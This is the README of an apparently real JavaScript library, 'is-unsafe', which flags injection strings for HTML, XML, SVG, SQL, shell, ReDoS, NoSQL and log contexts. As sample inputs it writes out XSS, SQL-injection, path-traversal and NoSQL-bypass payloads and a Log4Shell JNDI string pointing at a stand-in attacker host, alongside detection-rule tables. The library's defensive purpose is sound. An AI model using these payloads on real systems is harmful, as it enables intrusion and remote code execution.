# `is-unsafe`

> Zero-dependency, DOM-free, tree-shakeable pure predicate for detecting unsafe strings across HTML, XML, SVG, SQL, SQL-STRICT, SHELL, REDOS, NOSQL, and LOG contexts.

[![npm version](https://img.shields.io/npm/v/is-unsafe.svg)](https://www.npmjs.com/package/is-unsafe)
[![license](https://img.shields.io/npm/l/is-unsafe.svg)](LICENSE)

---

## Why `is-unsafe`?

Sanitizer libraries like [DOMPurify](https://github.com/cure53/DOMPurify) require a DOM. They cannot run inside XML parsers, template engines, or server-side pipelines that process strings before they ever reach a browser.

`is-unsafe` fills that gap. It is a **pure predicate** — it answers one question:

> *Is this string value unsafe in a given context?*

It never mutates strings. It never touches the DOM. It has zero runtime dependencies.

### Motivating use case: `@nodable/entities` / `fast-xml-parser`

DOCTYPE blocks can define custom entities with arbitrary values:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE urlset [
  <!ENTITY xss '</script><script>alert(document.domain)</script><x y="'>
]>
<urlset>
  <url><loc>https://example.com/&xss;</loc></url>
</urlset>
```

When `@nodable/entities` resolves `&xss;`, it produces a raw string containing `</script><script>alert(...)`. Whether that string is dangerous depends on where it ends up. `is-unsafe` answers that question — without a DOM.

---

## Installation

```sh
npm install is-unsafe
```

> **Always check the final string.** If your code builds a value by concatenating parts, call `isUnsafe` on the *result*, not on the pieces. Two harmless strings can become unsafe only once joined:
>
> ```js
> const a = 'java', b = 'script&#58;alert(1)';
> isUnsafe(a, HTML);      // false
> isUnsafe(b, HTML);      // false
> isUnsafe(a + b, HTML);  // true  ← check this one
> ```

---

## Quick start

```js
import { isUnsafe, HTML, SQL, SHELL, REDOS, NOSQL, LOG } from 'is-unsafe';

isUnsafe('<script>alert(1)</script>', HTML)    // → true
isUnsafe('New York, NY',             HTML)    // → false

isUnsafe("' OR 1=1--",              SQL)      // → true
isUnsafe('../etc/passwd',           SHELL)    // → true
isUnsafe('(a+)+',                   REDOS)    // → true  (ReDoS risk)
isUnsafe('{"$ne": null}',           NOSQL)    // → true
isUnsafe('${jndi:ldap://evil.com}', LOG)      // → true  (Log4Shell)
```

---

## v2 Migration guide

v2 replaces string context names with **imported pattern arrays**. This is the only breaking change.

| v1 | v2 |
|----|----|
| `import { isUnsafe, VALID_CONTEXTS } from 'is-unsafe'` | `import { isUnsafe, HTML, XML } from 'is-unsafe'` |
| `isUnsafe(v, 'HTML')` | `isUnsafe(v, HTML)` |
| `isUnsafe(v, ['HTML', 'XML'])` | `isUnsafe(v, [HTML, XML])` |
| `for (const ctx in VALID_CONTEXTS) { isUnsafe(v, ctx) }` | `for (const ctx of Object.values(VALID_CONTEXTS)) { isUnsafe(v, ctx) }` |

**Why the change?** String names required a central registry that imported all 9 context modules unconditionally. Even if you only used `HTML` and `XML`, your bundle included all contexts (~22 KB dead weight). With named imports, bundlers include only what you actually import.

---

## API

### `isUnsafe(value, context)` → `boolean`

Returns `true` if `value` is unsafe in the given context, `false` otherwise.

| Parameter | Type | Description |
|-----------|------|-------------|
| `value` | `string` | The string to test. Throws `TypeError` if not a string. |
| `context` | `PatternList \| PatternList[] \| RegExp` | A named context import, array of context imports, or a custom `RegExp`. |

```js
import { isUnsafe, HTML, XML } from 'is-unsafe';

// Single context
isUnsafe(value, HTML)

// Multiple contexts — true if unsafe in ANY of them
isUnsafe(value, [HTML, XML])

// Custom RegExp — true if pattern matches
isUnsafe(value, /my-pattern/i)
```

---

### `whyUnsafe(value, context)` → `MatchResult | null`

Like `isUnsafe`, but returns a `MatchResult` object describing the **first** matching rule, or `null` if the value is safe. Useful for logging and error messages.

```js
import { whyUnsafe, HTML } from 'is-unsafe';

const result = whyUnsafe('<script>alert(1)</script>', HTML);
// {
//   context:     'HTML',
//   id:          'html-script-open',
//   description: '<script opening tag',
//   pattern:     /<script[\s>/]/i
// }
```

---

### `allUnsafe(value, context)` → `MatchResult[]`

Returns **all** matching rules across the given context(s), or an empty array if safe. Useful for comprehensive audits.

```js
import { allUnsafe, HTML } from 'is-unsafe';

const findings = allUnsafe('<script onload="x"></script>', HTML);
// [
//   { context: 'HTML', id: 'html-script-open',          ... },
//   { context: 'HTML', id: 'html-script-close',         ... },
//   { context: 'HTML', id: 'html-inline-event-handler', ... }
// ]
```

---

### Named context exports

Each context is a named export. Import only what your code uses — unused contexts are dropped by your bundler.

```js
import { HTML, XML, SVG, SQL, SQL_STRICT, SHELL, REDOS, NOSQL, LOG } from 'is-unsafe';
```

Note: `SQL-STRICT` is exported as `SQL_STRICT` (hyphens are not valid in JS identifiers).

---

### Custom `PatternList`

You can supply your own pattern list alongside or instead of the built-in contexts:

```js
import { isUnsafe, whyUnsafe, HTML } from 'is-unsafe';

const INTERNAL_RULES = [
  { id: 'no-internal-ref', description: 'Blocks references to internal hostnames', pattern: /\.internal\b/i },
  { id: 'no-admin-path',   description: 'Blocks paths starting with /admin',        pattern: /\/admin\b/i   },
];

// Optional — sets the context label in MatchResult. Defaults to 'CUSTOM'.
INTERNAL_RULES.label = 'INTERNAL';

isUnsafe('https://api.internal/data', INTERNAL_RULES)  // true
isUnsafe('https://example.com/page',  INTERNAL_RULES)  // false

// Mix with built-in contexts
isUnsafe(value, [HTML, INTERNAL_RULES]);

const result = whyUnsafe('https://api.internal/admin', INTERNAL_RULES);
// { context: 'INTERNAL', id: 'no-internal-ref', description: '...', pattern: /.../ }
```

Without setting `.label`, `MatchResult.context` will be `'CUSTOM'`.

#### Entity decoding (v2.0.3+)

The built-in `HTML`, `XML` and `SVG` contexts test each rule against both the raw string and an entity-decoded copy, because browsers decode character references (`&#58;`, `&#x3a;`, `&colon;`, `&Tab;`, `&NewLine;`) before interpreting a URL.

A custom `PatternList` does **not** do this by default. Set `decodeEntities` to opt in:

```js
const INTERNAL_RULES = [
  { id: 'no-js-url', description: 'Blocks javascript: URLs', pattern: /javascript:/i },
];

isUnsafe('javascript&#58;alert(1)', INTERNAL_RULES);   // false (raw match only)

INTERNAL_RULES.decodeEntities = true;
isUnsafe('javascript&#58;alert(1)', INTERNAL_RULES);   // true  (decoded copy also tested)
```

Enable it only for markup contexts. Leave it off for SQL, shell, log and similar rules, which should match the string exactly as supplied.
---



### `VALID_CONTEXTS`

A convenience object that re-exports all contexts under their canonical names. Useful for tooling or exhaustive checks across all contexts.

> **Warning:** importing `VALID_CONTEXTS` pulls in all 9 context modules. If your bundle size matters and you only need a few contexts, import them individually instead.

```js
import { VALID_CONTEXTS } from 'is-unsafe';

// { HTML: [...], XML: [...], SVG: [...], SQL: [...], 'SQL-STRICT': [...],
//   SHELL: [...], REDOS: [...], NOSQL: [...], LOG: [...] }

// Iterate all contexts:
for (const [name, ctx] of Object.entries(VALID_CONTEXTS)) {
  if (isUnsafe(value, ctx)) console.log(`Unsafe in ${name}`);
}
```

---

## Contexts

### `HTML`

XSS vectors when a string is rendered as HTML:

| Rule ID | What it catches |
|---------|----------------|
| `html-script-open` | `<script` opening tag |
| `html-script-close` | `</script>` closing tag |
| `html-javascript-protocol` | `javascript:` URI (with whitespace obfuscation) |
| `html-vbscript-protocol` | `vbscript:` URI |
| `html-data-html` | `data:text/html` URI |
| `html-data-xhtml` | `data:application/xhtml+xml` URI |
| `html-data-svg` | `data:image/svg+xml` URI |
| `html-inline-event-handler` | `onclick=`, `onerror=`, `onload=`, etc. |
| `html-entity-obfuscated-script` | `&#x3C;script`, `&#60;script`, `&lt;script` |
| `html-entity-obfuscated-javascript` | Entity-encoded leading letters of `javascript:` (colon/letter/tab encodings are also caught — see *Entity decoding* below) |
| `html-style-expression` | CSS `expression()` — IE code execution |
| `html-object-embed` | `<object>` and `<embed>` tags |
| `html-base-tag` | `<base href=` — relative URL hijacking |
| `html-meta-refresh` | `<meta http-equiv="refresh"` |
| `html-srcdoc` | `srcdoc=` attribute on iframes |
| `html-iframe` | `<iframe` tag |
| `html-form` | `<form` tag — phishing injection |

---

**Entity decoding (HTML, XML, SVG).** Browsers decode character references before interpreting a URL, so `javascript&#58;alert(1)` is a `javascript:` URL. These three contexts therefore test every rule against the raw input **and** an entity-decoded copy. Decoded forms: decimal/hex numeric references (any leading zeros, semicolon optional), `&colon;`, `&Tab;`, `&NewLine;`. Named references are case-sensitive and need `;`. `&amp;` is intentionally not decoded (double-encoded text renders as text). Other contexts (SQL, SHELL, LOG, …) are matched byte-for-byte.

---

### `XML`

Parser-level attacks in XML documents (distinct from HTML XSS):

| Rule ID | What it catches |
|---------|----------------|
| `xml-cdata-injection` | `<![CDATA[` injection |
| `xml-cdata-close` | `]]>` — closes an enclosing CDATA section |
| `xml-processing-instruction` | `<?xml-stylesheet`, `<?php`, `<?asp` |
| `xml-doctype-injection` | `<!DOCTYPE` embedded in content |
| `xml-entity-system` | `SYSTEM "..."` — XXE external entity |
| `xml-entity-public` | `PUBLIC "..."` — XXE external entity |
| `xml-entity-declaration` | `<!ENTITY` declaration |
| `xml-billion-laughs` | Repeated entity refs `&e1;&e2;&e3;` — expansion attack |
| `xml-namespace-confusion` | `xmlns=` attribute injection |
| `xml-comment-injection` | `<!--` comment open |
| `xml-comment-close` | `-->` comment close |
| `xml-pi-close` | `?>` processing instruction close |

---

### `SVG`

SVG-specific XSS vectors that bypass HTML-only sanitizers (including documented DOMPurify bypass patterns):

| Rule ID | What it catches |
|---------|----------------|
| `svg-script-element` | `<script` inside SVG |
| `svg-xlink-href-javascript` | `xlink:href="javascript:..."` |
| `svg-href-javascript` | `href="javascript:..."` |
| `svg-foreignobject` | `<foreignObject>` — embeds HTML inside SVG |
| `svg-use-external` | `<use href=` pointing to external URL |
| `svg-animate-href` | `<animate attributeName="href"` — dynamic href injection |
| `svg-animate-xlinkhref` | `<animate attributeName="xlink:href"` |
| `svg-set-javascript` | `<set to="javascript:..."` |
| `svg-event-handler` | SVG event handlers (`onload=`, `onactivate=`, `onbegin=`, etc.) |
| `svg-filter-feimage` | `<feImage href=` — external resource load |
| `svg-image-external` | `<image xlink:href=` with http/javascript URL |
| `svg-style-javascript` | `style=` containing `javascript:` |

---

### `SQL` and `SQL_STRICT`

Two tiers of SQL injection detection, chosen based on what kind of input you're validating.

**Use `SQL`** for general user-facing fields (names, descriptions, search queries). Its 15 rules are high-precision with very low false-positive risk.

**Use `SQL_STRICT`** when the input is specifically a SQL fragment or database identifier — it includes all `SQL` rules plus three additional rules that would produce false positives on general text:

| Extra rule in SQL_STRICT | Why it's noisy on general text |
|--------------------------|-------------------------------|
| `sql-line-comment` (`--`) | Fires on `"see note -- above"`, CSS `var(--primary)` |
| `sql-stacked-query` (`;SELECT`) | Semicolons are normal punctuation |
| `sql-hex-encoding` (`0xDEAD`) | Hex values appear in technical docs and logs |

**Base `SQL` rules (present in both):**

| Rule ID | What it catches |
|---------|----------------|
| `sql-block-comment` | `/*` — comment-based bypass |
| `sql-union-select` | `UNION SELECT` — data extraction |
| `sql-tautology-or` | `OR 1=1`, `OR 'a'='a'` — always-true bypass |
| `sql-tautology-and` | `AND 1=1`, `AND 'a'='a'` |
| `sql-quote-escape` | `\'` or `''` — string termination attempts |
| `sql-drop-table` | `DROP TABLE` |
| `sql-insert-into` | `INSERT INTO` |
| `sql-delete-from` | `DELETE FROM` |
| `sql-update-set` | `UPDATE ... SET` |
| `sql-exec-xp` | `EXEC xp_` — SQL Server extended procedures |
| `sql-sleep-waitfor` | `SLEEP(` / `WAITFOR DELAY` — time-based blind injection |
| `sql-cast-convert` | `CAST(` / `CONVERT(` — obfuscation |
| `sql-char-function` | `CHAR(` — ASCII character encoding |
| `sql-information-schema` | `INFORMATION_SCHEMA` — metadata extraction |
| `sql-load-file` | `LOAD_FILE(` / `INTO OUTFILE` — file system access |

---

### `SHELL`

Shell injection and path traversal vectors:

| Rule ID | What it catches |
|---------|----------------|
| `shell-path-traversal-unix` | `../` — Unix directory traversal |
| `shell-path-traversal-win` | `..\` — Windows directory traversal |
| `shell-absolute-path-unix` | Leading `/` — absolute Unix path |
| `shell-absolute-path-win` | `C:\` / `D:\` etc. — absolute Windows path |
| `shell-null-byte` | `\x00` or `%00` — null byte injection |
| `shell-command-subst` | `` `cmd` `` / `$(cmd)` — command substitution |
| `shell-pipe` | `|` — command piping |
| `shell-semicolon` | `;` — command chaining |
| `shell-ampersand` | `&&` / `&` — background / logical AND |
| `shell-redirect` | `>` / `>>` / `<` — I/O redirection |

---

### `REDOS`

Patterns dangerous when compiled as a RegExp (catastrophic backtracking):

| Rule ID | What it catches |
|---------|----------------|
| `redos-nested-quantifier` | `(a+)+`, `(a*)*` — nested quantifiers |
| `redos-overlapping-alternation` | `(a|a)+` — ambiguous alternation |
| `redos-star-plus-adjacent` | `a*+` / `(a+)*` — adjacent unbounded quantifiers |

---

### `NOSQL`

MongoDB query operator injection and prototype pollution:

| Rule ID | What it catches |
|---------|----------------|
| `nosql-where-operator` | `$where:` — server-side JS execution |
| `nosql-ne-operator` | `$ne:` — not-equal authentication bypass |
| `nosql-gt-operator` | `$gt:` / `$gte:` — greater-than bypass |
| `nosql-lt-operator` | `$lt:` / `$lte:` — less-than bypass |
| `nosql-regex-operator` | `$regex:` — blind character-by-character extraction |
| `nosql-or-operator` | `$or: [` — always-true condition injection |
| `nosql-and-operator` | `$and: [` — logical AND injection |
| `nosql-nor-operator` | `$nor: [` — logical NOR injection |
| `nosql-exists-operator` | `$exists:` — field enumeration |
| `nosql-in-operator` | `$in: [` — value enumeration |
| `nosql-expr-operator` | `$expr:` — aggregation expression injection |
| `nosql-function-operator` | `$function:` — arbitrary JavaScript (MongoDB 4.4+) |
| `nosql-accumulator-operator` | `$accumulator:` — custom JS aggregation |
| `nosql-proto-pollution` | `__proto__` — prototype pollution |
| `nosql-constructor-prototype` | `constructor.prototype` or JSON key adjacency |
| `nosql-proto-bracket` | `["__proto__"]` — bracket-notation prototype pollution |

Patterns handle both bare form (`$ne: null`) and JSON key form (`{"$ne": null}`) by allowing an optional closing quote between the operator name and the colon.

---

### `LOG`

Injection vectors dangerous when a string is written to a log file or passed to a logging framework:

| Rule ID | What it catches |
|---------|----------------|
| `log-crlf-injection` | Literal `\r` or `\n` — fake log line injection |
| `log-url-encoded-crlf` | `%0d`, `%0a`, `%0D`, `%0A` — URL-encoded newlines |
| `log-unicode-newline` | U+2028, U+2029 — Unicode line/paragraph separators |
| `log-log4shell-jndi` | `${jndi:...}` — Log4Shell RCE (CVE-2021-44228) |
| `log-log4shell-obfuscated` | `${::-` — Log4j WAF-bypass prefix |
| `log-log4j-lookup` | `${env:}`, `${sys:}`, `${ctx:}` — data exfiltration lookups |
| `log-ssti-double-brace` | `{{expression}}` — Jinja2, Twig, Handlebars SSTI |
| `log-ssti-hash-brace` | `#{expression}` — Thymeleaf, Velocity, ERB SSTI |
| `log-ssti-dollar-brace` | `${expr.method()}` — JSP EL, Freemarker, SpEL SSTI |
| `log-ssti-percent-tag` | `<%= expression %>` — Ruby ERB, ASP |
| `log-null-byte` | `\x00` or `%00` — truncates log entries |
| `log-ansi-escape` | `ESC[` — ANSI escape sequences that manipulate terminal output |

> **Note:** The `log-crlf-injection` rule flags literal newline characters (`\n`, `\r`). Apply `LOG` only to single-line log field values (usernames, IDs, request parameters), not to multi-line content.

---

## Integration examples

### `@nodable/entities` — `postCheck` callback (the motivating use case)

```js
import { isUnsafe, HTML } from 'is-unsafe';
import { EntityDecoder, ALL_ENTITIES } from '@nodable/entities';

const dec = new EntityDecoder({
  namedEntities: ALL_ENTITIES,
  postCheck: (resolved, original) => {
    if (isUnsafe(resolved, HTML)) {
      return original;               // keep literal &entity; reference
      // or: throw new Error(`Unsafe entity blocked: ${original}`);
      // or: return '[BLOCKED]';
    }
    return resolved;
  }
});
```

Only `html.js` ends up in your bundle — `XML`, `SQL`, and all other contexts are excluded automatically.

### `fast-xml-parser` — entity check for HTML + XML contexts

```js
import { isUnsafe, HTML, XML } from 'is-unsafe';

onInputEntity: (name, value) =>
  isUnsafe(value, [HTML, XML]) ? ENTITY_ACTION.BLOCK : ENTITY_ACTION.ALLOW,
```

Bundle cost: only `html.js` + `xml.js` (~5.8 KB).

### Logging with `whyUnsafe`

```js
import { isUnsafe, whyUnsafe, HTML, SQL } from 'is-unsafe';

function safeInsert(value, context) {
  if (isUnsafe(value, context)) {
    const reason = whyUnsafe(value, context);
    logger.warn('Blocked unsafe value', { ruleId: reason.id, context: reason.context });
    throw new Error(`Unsafe value rejected (${reason.id})`);
  }
  return value;
}
```

### Auditing with `allUnsafe`

```js
import { allUnsafe, HTML, SQL, SHELL } from 'is-unsafe';

const findings = allUnsafe(userInput, [HTML, SQL, SHELL]);
if (findings.length > 0) {
  auditLog.record({ input: userInput, findings: findings.map(f => f.id) });
}
```

### SQL vs SQL_STRICT — choosing the right tier

```js
import { isUnsafe, SQL, SQL_STRICT } from 'is-unsafe';

// General text field (name, description, comment) — use SQL
function validateUserBio(bio) {
  if (isUnsafe(bio, SQL)) throw new Error('Invalid content');
  return bio;
}

// Dedicated SQL identifier input (table name picker, column filter) — use SQL_STRICT
function validateTableName(name) {
  if (isUnsafe(name, SQL_STRICT)) throw new Error('Invalid identifier');
  return name;
}

validateUserBio("see note -- above");  // passes (-- alone is fine for general text)
validateTableName("users -- comment"); // blocked by SQL_STRICT
```

### File upload path guard

```js
import { isUnsafe, SHELL } from 'is-unsafe';

function validateUploadPath(filename) {
  if (isUnsafe(filename, SHELL)) throw new Error('Invalid filename');
  return filename;
}

validateUploadPath('document.pdf');          // OK
validateUploadPath('../../../etc/passwd');   // throws
validateUploadPath('file.txt\x00.jpg');      // throws (null byte)
```

### User-supplied regex guard

```js
import { isUnsafe, whyUnsafe, REDOS } from 'is-unsafe';

function compileUserRegex(pattern) {
  if (isUnsafe(pattern, REDOS)) {
    const detail = whyUnsafe(pattern, REDOS);
    throw new Error(`ReDoS risk in pattern (${detail.id})`);
  }
  return new RegExp(pattern);
}

compileUserRegex('^[a-z]+$');   // OK
compileUserRegex('(a+)+');      // throws — nested quantifier
```

### MongoDB input guard

```js
import { isUnsafe, NOSQL } from 'is-unsafe';

function safeMongoValue(value) {
  if (isUnsafe(value, NOSQL)) throw new Error('Unsafe MongoDB value');
  return value;
}

safeMongoValue('alice');            // OK
safeMongoValue('{"$ne": null}');    // throws — $ne bypass
safeMongoValue('__proto__');        // throws — prototype pollution
```

### Log field guard

```js
import { isUnsafe, LOG } from 'is-unsafe';

function safeLogField(value) {
  if (isUnsafe(value, LOG)) throw new Error('Unsafe log value');
  return value;
}

safeLogField('alice');                      // OK
safeLogField('${jndi:ldap://evil.com}');    // throws — Log4Shell
safeLogField("value\nfake log entry");      // throws — CRLF injection
```

### Checking all contexts (tooling / security scanners)

```js
import { isUnsafe, VALID_CONTEXTS } from 'is-unsafe';

for (const [name, ctx] of Object.entries(VALID_CONTEXTS)) {
  if (isUnsafe(value, ctx)) {
    console.log(`Unsafe in ${name}`);
  }
}
```

> Note: this import brings in all 9 context modules. Fine for CLI tools and scanners; use individual named imports in application bundles.

---

## Design principles

| Principle | Detail |
|-----------|--------|
| **Predicate only** | Returns `true`/`false`. Never mutates strings. |
| **Zero dependencies** | No jsdom, no DOM, no framework coupling. |
| **Tree-shakeable** | Each context is an independent named export. Unused contexts are dropped by bundlers. |
| **Context-aware** | "Unsafe" is not absolute — it depends on where the value will be used. |
| **Caller decides action** | `is-unsafe` classifies. Escaping, throwing, or logging is the caller's responsibility. |
| **ReDoS-safe** | All detection patterns use bounded quantifiers. The irony of a security package triggering its own vulnerability (as the `sql-injection` npm package does) is avoided by design. |
| **Extensible** | Custom `PatternList` arrays work alongside built-in contexts. Set `.label` on your list to get meaningful context names in `MatchResult`. |
| **False positives over false negatives** | In parser context, blocking a legitimate value is better than passing a malicious one. |

---

## What `is-unsafe` is NOT

- **Not a sanitizer** — it does not modify strings
- **Not a middleware** — no Express/Koa coupling
- **Not a firewall** — it does not block requests
- **Not a complete security solution** — one layer of defence-in-depth

---

## Comparison with existing packages

| Package | Problem |
|---------|---------|
| `dompurify` | Requires DOM/jsdom. Sanitizer, not predicate. Has documented SVG/XML bypass vulnerabilities. |
| `xss` | Sanitizer — rewrites the string. HTML-only. No predicate API. |
| `xss-filters` | Explicitly documented as unable to be used inside `<svg>`, `<object>`, `<embed>`. |
| `xss-checker` | 465 kB payload list, 6 years abandoned, 5 dependents. |
| `is-sql-injection` | Philosophically closest, but v1.0.0 only, 8 years abandoned, 19 dependents. |
| `sql-injection` | Express middleware. Has an active ReDoS CVE on its own detection patterns. |
| **`is-unsafe`** | Actively maintained. DOM-free. Pure predicate. Tree-shakeable. Covers HTML, XML, SVG, SQL (two tiers), SHELL, REDOS, NOSQL, and LOG as distinct contexts. |

The `SVG` context is the key differentiator for XSS — no existing package covers SVG-specific vectors (`xlink:href`, `foreignObject`, `animate`/`set` element attacks). The `XML` context covers parser-level attacks that DOMPurify has documented bypass vulnerabilities for. The `NOSQL` and `LOG` contexts (including Log4Shell) have no equivalent in any current predicate package.

---

## Running tests

```sh
npm install
npm test
```

Tests use [Jasmine](https://jasmine.github.io/). Source in `src/`, specs in `specs/`.

---

## License

MIT
